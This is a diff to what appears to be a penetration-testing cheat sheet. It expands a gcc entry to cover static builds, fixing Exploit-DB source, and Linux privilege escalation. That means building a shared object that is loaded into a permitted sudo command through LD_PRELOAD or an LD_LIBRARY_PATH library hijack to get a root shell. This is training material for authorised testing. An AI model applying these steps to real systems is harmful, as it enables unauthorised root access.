@@ -1512,21 +1512,36 @@ nmap -Pn -sT -p <port> 240.0.0.1`,
     id: "cc-gcc",
     section: "Compile",
     title: "gcc",
-    look: "You only compile when a stock binary will not do. Match the target. A Kali-built dynamic binary often will not run on Ubuntu 20.04.",
-    cmd: `gcc file.c -o out
+    look: "Compile only when a release binary will not do. Do it on the target if gcc is there. A Kali dynamic binary looks for Kali's glibc and dies on an older box. A shared object is not a program. It is a library the dynamic linker maps into a program that is already running.",
+    cmd: `# 1. On the target, if gcc exists. file.c is the source. -o is the output name.
+gcc file.c -o out
+# 2. What you built. ELF, 32 or 64 bit, static or dynamic.
+file out
+# 3. Dynamic only. These are the .so files it will open at start. Not copied into the file.
+ldd out
+# 4. Older target, or you had to compile on Kali. -static copies libc into the file.
+gcc -static file.c -o out
 file out
 ldd out
-# if the target is older
-gcc -static file.c -o out
-ldd out`,
+# 5. A shared object. -shared writes a .so, not a program. -fPIC lets the linker place it at any address.
+#    There is no main. A constructor runs when the library is loaded, before the program's main.
+gcc -fPIC -shared -nostartfiles -o /tmp/p.so p.c
+# 6. LD_PRELOAD, only if sudo -l keeps that variable. Your .so is loaded into the allowed root command.
+sudo LD_PRELOAD=/tmp/p.so <allowed-command>
+# 7. LD_LIBRARY_PATH. ldd prints a real name. Your file must use that name. The linker looks in /tmp first.
+gcc -shared -fPIC -o /tmp/libselinux.so.1 hijack.c
+sudo LD_LIBRARY_PATH=/tmp <allowed-command>`,
     alive: `ELF 64-bit LSB executable, statically linked
-ldd: not a dynamic executable`,
+ldd: not a dynamic executable
+# or, for a library
+ELF 64-bit LSB shared object
+# then whoami is root`,
     dead: `/lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34 not found
-# or
 invalid preprocessing directive #Exploit
-# or
-missing terminating " character`,
-    next: "GLIBC errors: rebuild with -static. The #Exploit lines are Exploit-DB headers, not C. Delete them or turn them into // comments. A broken string means a quote was split across two lines. Put it back on one line.",
+missing terminating " character
+# ldd: not a dynamic executable, so there is no .so to hijack
+# sudo strips LD_PRELOAD, or the SUID binary ignores LD_*`,
+    next: "GLIBC_2.34 means you uploaded the dynamic build. Rebuild with -static. #Exploit is an Exploit-DB header, not C. Delete it or make it a // comment. A broken string is a quote split across two lines. Put it back on one line. A .so that is the wrong filename, or a static binary, never loads. That is the linker, not a failed exploit.",
   },
   {
     id: "cc-win",
